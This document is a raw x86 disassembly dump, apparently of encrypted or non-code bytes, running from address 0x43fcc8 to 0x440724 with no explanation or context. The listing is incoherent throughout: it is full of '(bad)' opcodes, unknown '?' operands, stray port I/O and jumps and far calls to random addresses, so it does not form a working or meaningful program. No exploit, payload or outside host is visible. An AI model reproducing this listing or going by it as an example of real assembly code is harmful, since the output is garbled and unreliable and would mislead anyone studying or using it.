  43fcc8:	or     eax,0xd3854de7
  43fccd:	jo     0x43fd1d
  43fccf:	pop    esp
  43fcd0:	retf   0x541d
  43fcd3:	add    BYTE PTR ds:0x4bc0fde7,cl
  43fcd9:	or     eax,DWORD PTR [eax+eax*1]
	...
  43fcf8:	add    BYTE PTR [eax],al
  43fcfa:	or     eax,0xd7cee5e7
  43fcff:	xchg   esi,eax
  43fd00:	inc    DWORD PTR [ebp+0x7dbddad5]
  43fd06:	leave  
  43fd07:	mov    DWORD PTR [edx-0x3bacf539],0x641d8497
  43fd11:	xchg   DWORD PTR [ebx+0x3],eax
  43fd14:	mov    edi,DWORD PTR [edi+0x4c20443]
  43fd1a:	or     eax,0xc1ccd02b
  43fd1f:	and    edx,eax
  43fd21:	int3   
  43fd22:	pop    ecx
  43fd23:	mov    ah,0x8c
  43fd25:	in     al,dx
  43fd26:	(bad)  [ecx+0x71]
  43fd29:	or     BYTE PTR [eax-0x7ff78ecb],dl
  43fd2f:	popf   
  43fd30:	fwait
  43fd31:	pop    edx
  43fd32:	enter  0x828,0x0
  43fd36:	xchg   esi,eax
  43fd37:	popf   
  43fd38:	pop    ebp
  43fd39:	add    eax,0x768affd3
  43fd3e:	or     edi,DWORD PTR [eax-0xab8fe85]
  43fd44:	mov    cl,0x5e
  43fd46:	cmp    esp,0xffffffe6
  43fd49:	mov    edi,ds
  43fd4b:	aaa    
  43fd4c:	call   0x24fe:0x6833b78c
  43fd53:	cmc    
  43fd54:	out    0x3,eax
  43fd56:	sahf   
  43fd57:	sti    
  43fd58:	arpl   WORD PTR [ecx],ax
  43fd5a:	mov    al,ds:0x496e14
	...
  43fd7b:	add    BYTE PTR [ebp-0x77a7d678],bh
  43fd81:	shr    al,0x84
  43fd84:	sar    bh,cl
  43fd86:	or     eax,0xfe057ec6
  43fd8b:	sar    BYTE PTR [esi+0x9],1
  43fd8e:	sbb    bh,BYTE PTR [ecx+ecx*4+0x4600b2f4]
  43fd95:	push   ebx
  43fd96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fd97:	pop    es
  43fd98:	or     eax,0xdb37189
  43fd9d:	add    bh,ah
  43fd9f:	add    al,0x97
  43fda1:	mov    ds:0x890d03e7,eax
  43fda6:	jno    0x43fd53
  43fda8:	or     eax,0xd6de700
  43fdad:	push   0xffffffe7
  43fdaf:	mov    ss,WORD PTR [ecx+0xf]
  43fdb2:	rol    DWORD PTR [edx],0x4f
  43fdb5:	pop    eax
  43fdb6:	std    
  43fdb7:	add    esi,DWORD PTR [ebx]
  43fdb9:	add    BYTE PTR [esi+0x59],ah
  43fdbc:	xor    DWORD PTR [eax],eax
  43fdbe:	dec    cx
  43fdc0:	(bad)  
  43fdc2:	mov    esp,0x65ffeb03
  43fdc7:	pop    ecx
  43fdc8:	loope  0x43fdc9
  43fdca:	jae    0x43fd5d
  43fdcc:	push   ebp
  43fdcd:	jmp    esi
  43fdcf:	add    ebx,edx
  43fdd1:	add    BYTE PTR [eax],0x5f
  43fdd4:	mov    ?,edi
  43fdd6:	(bad)  
  43fdd7:	call   0x1206789c
  43fddc:	stc    
  43fddd:	in     eax,dx
  43fdde:	stc    
  43fddf:	push   ds
	...
  43fdfc:	add    BYTE PTR [eax],al
  43fdfe:	cdq    
  43fdff:	(bad)  
  43fe00:	sub    eax,0x20bb8929
  43fe05:	fs inc edi
  43fe07:	push   es
  43fe08:	xchg   esp,eax
  43fe09:	sub    DWORD PTR [ebp-0x51587874],ebp
  43fe0f:	jl     0x43fe63
  43fe11:	lea    edx,[ecx+0x508c5ab4]
  43fe17:	sti    
  43fe18:	push   DWORD PTR [ebp+edi*1-0x2252333d]
  43fe1f:	(bad)  
  43fe20:	int3   
  43fe21:	cmp    al,0x96
  43fe23:	in     al,0x85
  43fe25:	and    al,0x9
  43fe27:	jge    0x43fe74
  43fe29:	(bad)  [edi+0x1e1608e4]
  43fe2f:	stc    
  43fe30:	xchg   ecx,esi
  43fe32:	xchg   edi,eax
  43fe33:	aas    
  43fe34:	or     al,0x60
  43fe36:	sbb    DWORD PTR [ebx+0x78],edi
  43fe39:	in     eax,dx
  43fe3a:	sub    DWORD PTR [ebx],0xf5593785
  43fe40:	xchg   ebx,eax
  43fe41:	mov    cl,0x9
  43fe43:	add    BYTE PTR [eax],al
  43fe45:	bound  edx,QWORD PTR [ebx+0x44]
  43fe48:	or     eax,0xad6f
  43fe4d:	jmp    0x1e7444e9
  43fe52:	cmp    DWORD PTR [edx+0x4f],eax
  43fe55:	pop    ss
  43fe56:	test   eax,0xee92dee
  43fe5b:	jne    0x43fe21
  43fe5d:	cmc    
  43fe5e:	xchg   ebp,eax
  43fe5f:	shl    BYTE PTR [ecx+eiz*8+0x0],0x0
	...
  43fe80:	(bad)  
  43fe84:	xchg   edi,ebx
  43fe86:	pop    ebx
  43fe87:	add    BYTE PTR [edi],ah
  43fe89:	xchg   DWORD PTR [esi],edi
  43fe8b:	xor    cl,bh
  43fe8d:	pop    eax
  43fe8e:	cld    
  43fe8f:	push   edx
  43fe90:	out    dx,eax
  43fe91:	shr    eax,0x29
  43fe94:	pop    ss
  43fe95:	repz test DWORD PTR [ebx-0x3f82f7e0],0xcf7b08a0
  43fea0:	sbb    esp,edi
  43fea2:	push   es
  43fea3:	or     DWORD PTR [ecx+0x274b50f3],0xeb0573fb
  43fead:	xchg   esp,eax
  43feae:	idiv   edi
  43feb0:	sbb    edx,DWORD PTR [eax-0x798b03c3]
  43feb6:	xor    BYTE PTR ds:[edi-0x195e173c],bl
  43febd:	icebp  
  43febe:	test   DWORD PTR [ebx-0x3f830550],0xcf7aff60
  43fec8:	retf   
  43fec9:	test   DWORD PTR [esi],edi
  43fecb:	xor    BYTE PTR [ecx+0x50],bh
  43fece:	clc    
  43fecf:	push   ecx
  43fed0:	outs   dx,DWORD PTR ds:[esi]
  43fed1:	(bad)
  43fed4:	xchg   esi,eax
  43fed5:	icebp  
  43fed6:	test   DWORD PTR [ebx-0x3f830560],0xcf7aff20
  43fee0:	fwait
  43fee1:	test   DWORD PTR [esi],edi
  43fee3:	xor    BYTE PTR [eax],al
	...
  43ff01:	add    BYTE PTR [ecx+0x58],bl
  43ff04:	cld    
  43ff05:	push   edx
  43ff06:	aas    
  43ff07:	(bad)
  43ff0a:	repnz test DWORD PTR es:[ebx-0x3f830590],0xcf7b07a0
  43ff16:	sub    esp,esi
  43ff18:	sbb    al,BYTE PTR [ebp-0x74e98815]
  43ff1e:	or     eax,0xd008963
  43ff23:	jmp    0xb3b54264
  43ff28:	or     eax,DWORD PTR [ebx+0x7d0aac4d]
  43ff2e:	fdiv   QWORD PTR gs:[ecx+0x6]
  43ff32:	mov    ?,WORD PTR [eax]
  43ff34:	add    eax,0x9c5a0874
  43ff39:	stc    
  43ff3a:	dec    edx
  43ff3b:	adc    DWORD PTR [eax-0x7947bebd],edx
  43ff41:	inc    edx
  43ff42:	std    
  43ff43:	pop    ebp
  43ff44:	retf   
  43ff45:	call   0xfa3ff5e2
  43ff4a:	mov    ds,WORD PTR [ecx+eax*1]
  43ff4d:	or     DWORD PTR [ebp+0x74],0xfffffffe
  43ff51:	jl     0x43ff9d
  43ff53:	loope  0x43fedc
  43ff55:	inc    edx
  43ff56:	(bad)  [ebx+0x49]
  43ff59:	cld    
  43ff5a:	pop    esi
  43ff5b:	cmp    BYTE PTR [edi-0x11b40a36],al
  43ff61:	stc    
  43ff62:	cli    
  43ff63:	pop    ebp
  43ff64:	pop    ecx
  43ff65:	clc    
	...
  43ff82:	add    BYTE PTR [eax],al
  43ff84:	mov    fs,WORD PTR [ebx+0x2bcd8308]
  43ff8a:	add    DWORD PTR [ebp-0x2e],edi
  43ff8d:	stos   BYTE PTR es:[edi],al
  43ff8e:	out    0x17,eax
  43ff90:	nop
  43ff91:	mov    ds:0x34861371,al
  43ff96:	add    BYTE PTR [esi],dh
  43ff98:	mov    ds:0xd00046b,eax
  43ff9d:	adc    eax,DWORD PTR [esi]
  43ff9f:	repnz into 
  43ffa1:	fbstp  TBYTE PTR [edx+0x3]
  43ffa4:	jb     0x440006
  43ffa6:	sti    
  43ffa7:	stc    
  43ffa8:	stos   BYTE PTR es:[edi],al
  43ffa9:	fs inc ecx
  43ffab:	cld    
  43ffac:	cmp    eax,0x8630425e
  43ffb1:	xchg   ecx,eax
  43ffb2:	in     al,dx
  43ffb3:	inc    edx
  43ffb4:	lahf   
  43ffb5:	add    BYTE PTR [edx-0x3],ah
  43ffb8:	or     BYTE PTR [ebx+eiz*8-0x1393b27a],bh
  43ffbf:	add    BYTE PTR [ecx+esi*8+0x3e],0x2c
  43ffc4:	mov    BYTE PTR [ebx+0x43],al
  43ffc7:	and    DWORD PTR [edx-0xf],0xf18e23b3
  43ffce:	mov    esp,0xeec0281f
  43ffd3:	lea    esi,[ebp+0x0]
  43ffd6:	out    0x3,eax
  43ffd8:	mov    esi,0xa185de07
  43ffdd:	add    bh,ah
  43ffdf:	add    eax,ecx
  43ffe1:	add    eax,0x6b05c111
  43ffe6:	in     al,dx
  43ffe7:	mov    esp,0x0
	...
  440004:	add    BYTE PTR [eax],al
  440006:	xor    cl,0xfa
  440009:	cld    
  44000a:	mov    BYTE PTR [edx],bh
  44000c:	mov    bh,0x8e
  44000e:	(bad)  
  44000f:	repz cwde 
  440011:	mov    BYTE PTR [edi-0x18],al
  440014:	jmp    0x440007
  440016:	add    al,0xf1
  440018:	data16 (bad) 
  44001a:	or     DWORD PTR [ebx-0x59],edi
  44001d:	ja     0x44002d
  44001f:	jge    0x43ffbb
  440021:	cld    
  440022:	call   0xe9926e4e
  440027:	jl     0x43ffe9
  440029:	cld    
  44002a:	pop    ecx
  44002b:	and    BYTE PTR [esp+edi*8+0x5e],ch
  44002f:	adc    al,0xf6
  440031:	ret    
  440032:	sbb    BYTE PTR [edx+0xd0347],al
  440038:	adc    al,0xc
  44003a:	clc    
  44003b:	jns    0x440088
  44003d:	add    ecx,DWORD PTR ds:0xbf0a1300
  440043:	mov    esp,0xb10e76ef
  440048:	pusha  
  440049:	cld    
  44004a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44004b:	lock add BYTE PTR [edx+0x50],ah
  44004f:	xor    BYTE PTR [ebx-0x7abe6eec],cl
  440055:	aaa    
  440056:	jbe    0x4400a9
  440058:	out    dx,eax
  440059:	pop    esi
  44005a:	cmp    DWORD PTR [edx+0x5b],0x4bb8d51
  440061:	fs dec esi
  440063:	imul   eax,DWORD PTR [ebx],0x6a
  440066:	pop    ecx
  440067:	mul    ch
  440069:	fadd   DWORD PTR [eax]
	...
  440087:	add    BYTE PTR [ebx+0x15e473f6],cl
  44008d:	xchg   esi,eax
  44008e:	test   al,0xe9
  440090:	push   cs
  440091:	add    BYTE PTR [esp+ebp*8-0x77],dh
  440095:	mov    cl,bh
  440097:	push   ds
  440098:	inc    ecx
  440099:	jp     0x4400de
  44009b:	loope  0x4400ac
  44009d:	sbb    BYTE PTR [ebx-0x7ab0c95c],cl
  4400a3:	scas   eax,DWORD PTR es:[edi]
  4400a4:	fidivr WORD PTR [edx-0x36]
  4400a7:	adc    ecx,esi
  4400a9:	loopne 0x4400a4
  4400ab:	neg    BYTE PTR [edx+0x4e6404bb]
  4400b1:	imul   edi,ebp,0x69
  4400b4:	(bad)  
  4400b5:	jmp    0x8559253f
  4400ba:	push   ebx
  4400bb:	stc    
  4400bc:	inc    ebx
  4400bd:	(bad)  
  4400be:	std    
  4400bf:	outs   dx,BYTE PTR ds:[esi]
  4400c0:	rol    DWORD PTR [eax],1
  4400c2:	add    cl,ch
  4400c4:	add    edi,DWORD PTR [edx-0x24]
  4400c7:	jmp    0xaac100da
  4400cc:	imul   DWORD PTR [edi+ecx*8-0x17]
  4400d0:	or     DWORD PTR [eax],0x850d3187
  4400d6:	inc    ebx
  4400d7:	mov    eax,ds:0x60083b92
  4400dc:	adc    ebp,edi
  4400de:	add    BYTE PTR [edx],dh
  4400e0:	add    cl,0x59
  4400e3:	add    BYTE PTR [edi],bl
  4400e5:	loope  0x44013c
  4400e7:	ret    
  4400e8:	jo     0x4400a2
  4400ea:	int3   
  4400eb:	int3   
	...
  440108:	add    BYTE PTR [eax],al
  44010a:	stc    
  44010b:	jle    0x4400f9
  44010d:	adc    DWORD PTR [eax],0x10
  440110:	add    DWORD PTR [ebp+0x7c],0x36
  440114:	retf   0xb989
  440117:	div    DWORD PTR [ebx]
  440119:	ret    0xfc59
  44011c:	test   BYTE PTR [edx-0x2],al
  44011f:	jle    0x4400fe
  440121:	pop    ebp
  440122:	ss clc 
  440124:	call   DWORD PTR [ebp-0x21]
  440127:	mov    bl,0xe0
  440129:	add    BYTE PTR [ebx+eax*1+0x33],ah
  44012d:	repnz cdq 
  44012f:	pop    es
  440130:	mov    eax,0xf7eaf39a
  440135:	pop    esi
  440136:	mov    edi,0x30c255e0
  44013b:	add    esi,DWORD PTR [ecx]
  44013d:	push   ss
  44013e:	cdq    
  44013f:	pop    es
  440140:	mov    eax,0xf7eb139c
  440145:	pop    esi
  440146:	lahf   
  440147:	loopne 0x44019e
  440149:	ret    0x330
  44014c:	dec    ebx
  44014d:	mov    eax,DWORD PTR [ecx+0x69da3313]
  440153:	(bad)  
  440154:	push   edx
  440155:	xor    esi,DWORD PTR [eax+ecx*2-0x39be1a7d]
  44015c:	or     al,0x0
  44015e:	outs   dx,DWORD PTR ds:[esi]
  44015f:	inc    eax
  440160:	or     al,0x89
  440162:	cmp    dl,BYTE PTR [ecx+eax*4]
  440165:	pop    esi
  440166:	mov    eax,0xe4848e2d
  44016b:	add    al,BYTE PTR [eax]
  44016d:	jb     0x44016f
	...
  44018b:	add    BYTE PTR [edi-0x6dc4f78f],bh
  440191:	add    BYTE PTR [eax],0x0
  440194:	mov    ah,0x70
  440196:	or     DWORD PTR [ecx],edi
  440198:	or     eax,0xd00c56f
  44019d:	fnstenv [eax+0x7]
  4401a0:	xchg   esi,eax
  4401a1:	jbe    0x440220
  4401a3:	add    BYTE PTR ds:0x14a8cd9,cl
  4401a9:	push   cs
  4401aa:	mov    DWORD PTR [edx+0x5],edi
  4401ad:	stos   BYTE PTR es:[edi],al
  4401ae:	mov    ebp,0x47d95a85
  4401b3:	js     0x4401d3
  4401b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4401b6:	jno    0x4401ed
  4401b8:	pop    ebp
  4401b9:	retf   0x710f
  4401bc:	or     DWORD PTR [edx],edx
  4401be:	(bad)  [edx-0x3]
  4401c1:	dec    DWORD PTR [ebp-0x226f238]
  4401c7:	jae    0x4401ce
  4401c9:	bound  ecx,QWORD PTR [edi+0x78]
  4401cc:	push   cs
  4401cd:	push   ss
  4401ce:	mov    WORD PTR [edx+0x21],ss
  4401d1:	pop    edx
  4401d2:	ja     0x4401e8
  4401d4:	or     eax,0xcb07fde
  4401d9:	fscale 
  4401db:	jl     0x440190
  4401dd:	loopne 0x4401dc
  4401df:	or     BYTE PTR [eax+0xdfffd61],dl
  4401e5:	jb     0x440226
  4401e7:	jl     0x44016f
  4401e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4401ea:	jne    0x44016f
  4401ec:	dec    ebp
  4401ed:	jae    0x4401f4
  4401ef:	add    DWORD PTR [eax],0x0
	...
  44020e:	aam    0xf6
  440210:	jns    0x440199
  440212:	or     eax,0xdb8fdd7
  440217:	pop    ss
  440218:	add    al,0x0
  44021a:	mov    BYTE PTR [edi-0x24a0f091],dl
  440220:	cmp    al,0xc9
  440222:	pop    esi
  440223:	repnz mov WORD PTR [edx+0x55],?
  440227:	pop    esp
  440228:	test   DWORD PTR [ecx],0xfffd6589
  44022e:	or     eax,0xcd826e00
  440233:	add    bh,ah
  440235:	add    edi,DWORD PTR [eax-0x7872d8bd]
  44023b:	(bad)  
  44023c:	out    0x3,eax
  44023e:	or     eax,0x88403111
  440243:	xchg   esi,eax
  440244:	xor    eax,DWORD PTR [ecx*1+0x4203fd00]
  44024b:	push   eax
  44024c:	adc    eax,0xe7788f87
  440251:	add    ecx,DWORD PTR ds:0x3de94f50
  440257:	add    bh,ah
  440259:	test   BYTE PTR [ecx+0x14],cl
  44025c:	les    edx,FWORD PTR fs:[ebx+eax*4]
  440260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440261:	add    cl,BYTE PTR ds:0x900a6e00
  440267:	xchg   esi,eax
  440268:	jnp    0x44026e
  44026a:	or     eax,0x71825e00
  44026f:	add    bh,ah
  440271:	add    eax,DWORD PTR [eax]
	...
  44028f:	add    ah,bl
  440291:	dec    esi
  440292:	outs   dx,BYTE PTR ds:[esi]
  440293:	mov    cl,BYTE PTR [ecx-0x3cfc1900]
  440299:	dec    edi
  44029a:	or     dl,bl
  44029c:	test   al,0xc3
  44029e:	xlat   BYTE PTR ds:[ebx]
  44029f:	cmp    al,0x4c
  4402a1:	std    
  4402a2:	arpl   WORD PTR [edx+ebx*1],di
  4402a5:	in     eax,dx
  4402a6:	out    0x8c,eax
  4402a8:	push   DWORD PTR [eax]
  4402aa:	daa    
  4402ab:	add    eax,DWORD PTR [edi+0x9517040]
  4402b1:	ja     0x44030c
  4402b3:	or     al,0xa
  4402b5:	inc    esi
  4402b6:	sub    ebp,DWORD PTR [ebx]
  4402b8:	ja     0x440322
  4402ba:	lock inc ecx
  4402bc:	imul   edi,DWORD PTR [ecx+0x69],0xe7000dbb
  4402c3:	jle    0x440292
  4402c5:	cld    
  4402c6:	jmp    FWORD PTR [esi+eax*4-0x1]
  4402ca:	(bad)  
  4402cb:	call   0xea0cac61
  4402d0:	push   cs
  4402d1:	add    BYTE PTR [eax],al
  4402d3:	adc    al,0x34
  4402d5:	imul   edi,eax,0xffffffe5
  4402d8:	add    eax,0xee9df84
  4402dd:	add    BYTE PTR [ebp+0x4a83012f],al
  4402e3:	fldcw  WORD PTR [eax]
  4402e5:	out    dx,al
  4402e6:	mov    WORD PTR [edi],ds
  4402e8:	or     eax,0x7d24873e
  4402ed:	test   BYTE PTR [ebx-0x7],cl
  4402f0:	jbe    0x44033f
  4402f2:	adc    eax,0xe9
	...
  44030f:	add    BYTE PTR [eax],al
  440311:	add    BYTE PTR [esi],cl
  440313:	test   DWORD PTR [ebx-0x1f],eax
  440316:	repz mov edi,0x6991dc78
  44031c:	sbb    al,0xe9
  44031e:	repnz inc al
  440321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440322:	push   es
  440323:	jmp    0x82993a21
  440328:	pop    edx
  440329:	rol    DWORD PTR [ecx],1
  44032b:	rol    BYTE PTR [ebp-0xb970ede],0x72
  440332:	inc    esi
  440333:	adc    bh,BYTE PTR [edi-0x7aa84b18]
  440339:	lahf   
  44033a:	sahf   
  44033b:	test   BYTE PTR [ebx-0x7],al
  44033e:	cld    
  44033f:	inc    ecx
  440340:	ins    BYTE PTR es:[edi],dx
  440341:	jb     0x44031e
  440343:	sqrtps xmm3,XMMWORD PTR [ecx-0x45682841]
  44034a:	push   cs
  44034b:	add    BYTE PTR [edi],ah
  44034d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44034e:	mov    DWORD PTR [eax],eax
  440350:	add    cl,ch
  440352:	xchg   DWORD PTR [edi-0x10],ecx
  440355:	pusha  
  440356:	xor    esi,DWORD PTR [eax+0x17]
  440359:	ja     0x4402e8
  44035b:	add    BYTE PTR [eax],al
  44035d:	add    ah,dh
  44035f:	push   ss
  440360:	push   ebp
  440361:	hlt    
  440362:	pop    edi
  440363:	inc    ecx
  440364:	or     BYTE PTR [ecx],al
  440366:	stc    
  440367:	out    0x7b,eax
  440369:	clc    
  44036a:	mov    ch,0x5b
  44036c:	jae    0x4402f3
  44036e:	je     0x4403e1
  440370:	jb     0x44035d
  440372:	pop    ds
  440373:	ja     0x4403b3
  440375:	or     BYTE PTR [eax],al
	...
  440393:	add    BYTE PTR [ecx],ah
  440395:	les    ebp,FWORD PTR [ebp+0x8]
  440398:	das    
  440399:	inc    edx
  44039a:	js     0x4403a7
  44039c:	fisub  DWORD PTR [edi+0x74]
  44039f:	popw   ds
  4403a1:	jb     0x4403b7
  4403a3:	cmp    ebx,DWORD PTR [esi+ebp*2]
  4403a6:	cli    
  4403a7:	mov    bh,ah
  4403a9:	rol    BYTE PTR cs:[ebp-0x14f19015],0x67
  4403b1:	js     0x4403f4
  4403b3:	add    bh,ch
  4403b5:	cmp    DWORD PTR [edx+ecx*4],eax
  4403b8:	pusha  
  4403b9:	jae    0x14bb480d
  4403bf:	or     BYTE PTR [esi+eiz*1+0x76cb72bf],ah
  4403c6:	adc    BYTE PTR ds:[edi+0x67577041],ch
  4403cd:	(bad)  
  4403ce:	stc    
  4403cf:	jge    0x44036d
  4403d1:	dec    edi
  4403d2:	dec    ecx
  4403d3:	adc    DWORD PTR [edx+0x63],edi
  4403d6:	call   0x434b04
  4403db:	sub    dl,cl
  4403dd:	add    DWORD PTR [eax],0x0
  4403e0:	and    al,0x7c
  4403e2:	ds jo  0x440422
  4403e5:	xchg   ebp,eax
  4403e6:	test   BYTE PTR [eax],al
  4403e8:	hlt    
  4403e9:	(bad)  
  4403ea:	and    BYTE PTR [esi-0x4],bh
  4403ed:	sbb    esi,DWORD PTR [esi+0x14]
  4403f0:	in     eax,0x74
  4403f2:	adc    BYTE PTR [ecx],al
  4403f4:	or     eax,0xff0053
	...
  440415:	add    BYTE PTR [eax-0xf],ch
  440418:	add    al,0x7b
  44041a:	loope  0x440471
  44041c:	jae    0x440432
  44041e:	or     eax,0xd3507ada
  440423:	mov    cl,0xf2
  440425:	test   DWORD PTR [eax-0x63],edx
  440428:	push   edx
  440429:	push   ebp
  44042a:	arpl   WORD PTR [esi-0x20],bp
  44042d:	pop    ebx
  44042e:	iret   
  44042f:	fdiv   st(5),st
  440431:	pop    eax
  440432:	push   esi
  440433:	(bad)  
  440434:	mov    ebp,0x5883965a
  440439:	mov    esi,0x5552d911
  44043e:	mov    ?,WORD PTR [eax+0x7b865af2]
  440444:	pop    eax
  440445:	mov    esi,0xccc1d919
  44044a:	push   ecx
  44044b:	xor    al,0xc1
  44044d:	int3   
  44044e:	dec    ecx
  44044f:	sbb    al,0xc1
  440451:	int3   
  440452:	inc    ecx
  440453:	stos   DWORD PTR es:[edi],eax
  440454:	xchg   ah,ch
  440456:	mov    esi,0x157b86b1
  44045b:	out    0xd6,al
  44045d:	sbb    DWORD PTR [edx-0x4d],0xc
  440461:	pop    ecx
  440462:	adc    BYTE PTR [ebp+0x16e85597],0xf9
  440469:	(bad)  
  44046a:	fsubr  DWORD PTR [ebp-0x56]
  44046d:	loopne 0x44047c
  44046f:	fscale 
  440471:	cmp    BYTE PTR [ebx],0x8b
  440474:	pop    es
  440475:	mov    edx,ebx
  440477:	outs   dx,BYTE PTR ds:[esi]
  440478:	push   ebx
  440479:	pop    ecx
	...
  440496:	add    BYTE PTR [eax],al
  440498:	(bad)  
  440499:	mov    ds:0x6e0d04bf,eax
  44049e:	jnp    0x440420
  4404a0:	or     eax,0x9304fdd9
  4404a5:	arpl   bp,di
  4404a7:	dec    DWORD PTR ds:0x42115c00
  4404ad:	mov    ch,BYTE PTR [edi+0x5c000d04]
  4404b3:	or     DWORD PTR [eax+0x5739573a],edx
  4404b9:	je     0x4404f6
  4404bb:	add    DWORD PTR [esi-0x76adb8],eax
  4404c1:	dec    ebp
  4404c2:	cmp    eax,0x713c404
  4404c7:	enter  0x0,0x66
  4404cb:	rol    BYTE PTR ds:0x54c197d,0xc1
  4404d2:	jmp    0xe74411da
  4404d7:	outs   dx,BYTE PTR ds:[esi]
  4404d8:	or     bh,BYTE PTR [ebx+0x29]
  4404db:	add    BYTE PTR ds:0xd2607d8,bh
  4404e1:	add    BYTE PTR [ecx],bl
  4404e3:	push   0xd
  4404e5:	shl    DWORD PTR [ecx],0x4c
  4404e8:	or     eax,0x7403e700
  4404ed:	adc    eax,DWORD PTR [edi]
  4404ef:	enter  0x30,0x66
  4404f3:	rcl    BYTE PTR ds:0x6d7d224a,0x0
  4404fa:	out    0x3,eax
	...
  440518:	add    BYTE PTR [eax],al
  44051a:	or     eax,0xb403e700
  44051f:	je     0x440547
  440521:	pop    ecx
  440522:	out    0xbd,al
  440524:	jecxz  0x440529
  440526:	push   ecx
  440527:	mov    esp,0xbc49c833
  44052c:	sub    ecx,eax
  44052e:	inc    ecx
  44052f:	mov    esp,0x7f3988bc
  440534:	sti    
  440535:	pop    es
  440536:	and    ch,cl
  440538:	out    0x50,eax
  44053a:	mov    edi,0x5af26e50
  44053f:	cmc    
  440540:	(bad)  
  440541:	call   0x2ccf0554
  440546:	std    
  440547:	in     eax,0xf9
  440549:	out    0xfd,al
  44054b:	pushf  
  44054c:	test   DWORD PTR [ecx+eax*1],ebp
  44054f:	bound  eax,QWORD PTR [ebx]
  440551:	cmp    BYTE PTR [edx-0x26300b74],dl
  440557:	out    0x4e,al
  440559:	cli    
  44055a:	mov    ch,0x80
  44055c:	or     DWORD PTR [ecx],0xffffffd8
  44055f:	out    0xf9,al
  440561:	shl    DWORD PTR [ebp+0x16],0x0
  440565:	jmp    0xadc1ec67
  44056a:	adc    al,BYTE PTR [ecx-0x19463a7d]
  440570:	stc    
  440571:	shr    BYTE PTR [ecx-0xa],cl
  440574:	sbb    DWORD PTR [edi+0xd],0x0
  440578:	add    BYTE PTR [ecx],bl
  44057a:	xchg   edx,eax
  44057b:	jl     0x440571
  44057d:	jg     0x44057f
	...
  44059b:	add    BYTE PTR [ecx+0x458150e6],bl
  4405a1:	fyl2xp1 
  4405a3:	outs   dx,BYTE PTR ds:[esi]
  4405a4:	xchg   ebp,eax
  4405a5:	fld    DWORD PTR [ebp+0x8c38d31]
  4405ab:	repnz dec eax
  4405ad:	add    BYTE PTR [ebx+0x4d],0x11
  4405b1:	test   BYTE PTR [edx-0x7afff118],dl
  4405b7:	pop    esp
  4405b8:	cli    
  4405b9:	out    0xf9,al
  4405bb:	ror    DWORD PTR ds:[ebp+0x50],0x9b
  4405c0:	xchg   ebx,eax
  4405c1:	jl     0x4405b7
  4405c3:	das    
  4405c4:	cmp    esi,esp
  4405c6:	push   eax
  4405c7:	cs sti 
  4405c9:	retf   
  4405ca:	(bad)  
  4405cb:	call   0xa62c05de
  4405d0:	lock (bad) 
  4405d2:	jmp    FWORD PTR [ecx+0x62]
  4405d5:	adc    eax,DWORD PTR [ebx-0x4a71c00]
  4405db:	sbb    bh,0xf3
  4405de:	add    DWORD PTR [ebp-0x81328],0x61
  4405e5:	ds cld 
  4405e7:	push   ecx
  4405e8:	add    DWORD PTR [ecx-0xc2c010c],0xf3d17de8
  4405f2:	test   DWORD PTR [ebx-0x3f830758],0xcb7aff18
  4405fc:	xchg   ebx,eax
  4405fd:	addr16 jge 0x440624
	...
  44061c:	add    BYTE PTR [eax],al
  44061e:	xor    ebx,0xfffffff7
  440621:	lea    ebx,[ecx]
  440623:	loopne 0x44066f
  440625:	lea    eax,[ecx-0x18]
  440628:	idiv   bh
  44062a:	xchg   ebx,eax
  44062b:	(bad)  
  44062c:	out    0xed,al
  44062e:	xor    ebx,0x7b
  440631:	les    ebp,FWORD PTR [eax-0x588b3f88]
  440637:	jle    0x4405fc
  440639:	jmp    DWORD PTR [ecx]
  44063b:	cmp    eax,esi
  44063d:	push   eax
  44063e:	out    dx,eax
  44063f:	js     0x440665
  440641:	push   ebx
  440643:	repnz test DWORD PTR [ebp-0x80e28],ecx
  44064a:	(bad)  
  44064c:	in     al,dx
  44064d:	inc    ebx
  44064f:	jle    0x440615
  440651:	add    al,0xe9
  440653:	mov    ebx,0xa6e70374
  440658:	test   DWORD PTR [ebx-0x8e817],0xf0458103
  440662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440663:	add    BYTE PTR [ebp-0x80d0d0c],0xe8
  44066a:	in     al,0xdf
  44066c:	idiv   edi
  44066e:	or     eax,0x8804c85a
  440673:	sbb    DWORD PTR [eax-0x3],edi
  440676:	(bad)  
  440677:	xor    ch,ch
  440679:	test   DWORD PTR [eax+0xaf9eebd],ecx
  44067f:	pop    esp
  440680:	push   edi
  440681:	lock add BYTE PTR [eax],al
	...
  4406a0:	pop    edi
  4406a1:	inc    esp
  4406a2:	jg     0x440698
  4406a4:	sti    
  4406a5:	fucomp st(6)
  4406a7:	call   0xfa32bab8
  4406ac:	mov    ss,WORD PTR [ecx+eax*1+0x14ccd83]
  4406b3:	jge    0x44067b
  4406b5:	mov    ebp,0x8d94380
  4406ba:	jns    0x44063f
  4406bc:	icebp  
  4406bd:	lods   eax,DWORD PTR ds:[esi]
  4406be:	out    dx,al
  4406bf:	stc    
  4406c0:	nop
  4406c1:	inc    ebx
  4406c2:	icebp  
  4406c3:	cli    
  4406c4:	mov    edx,0xa1ded59d
  4406c9:	test   esi,ebp
  4406cb:	jge    0x44069e
  4406cd:	aam    0x88
  4406cf:	rcr    BYTE PTR [ecx],0xda
  4406d2:	add    ch,0x9a
  4406d5:	jno    0x44065f
  4406d7:	and    al,0x92
  4406d9:	gs out dx,al
  4406db:	mov    ebx,DWORD PTR [eax-0x7d061144]
  4406e1:	pop    es
  4406e2:	jg     0x44066f
  4406e4:	sbb    DWORD PTR [esi-0x12],0xe0a865f9
  4406eb:	stc    
  4406ec:	push   0x59
  4406ee:	rol    DWORD PTR [eax+ecx*4],0x18
  4406f2:	jno    0x4406f1
  4406f4:	(bad)  
  4406f5:	xor    esi,ebp
  4406f7:	test   DWORD PTR [eax+0x4af9ecfc],ecx
  4406fd:	pop    ebx
  4406fe:	pop    eax
  4406ff:	clc    
  440700:	fild   WORD PTR [ebx-0x80]
  440703:	hlt    
	...
  440720:	add    BYTE PTR [eax],al
  440722:	cmp    edi,edi
  440724:	and    edx,esi
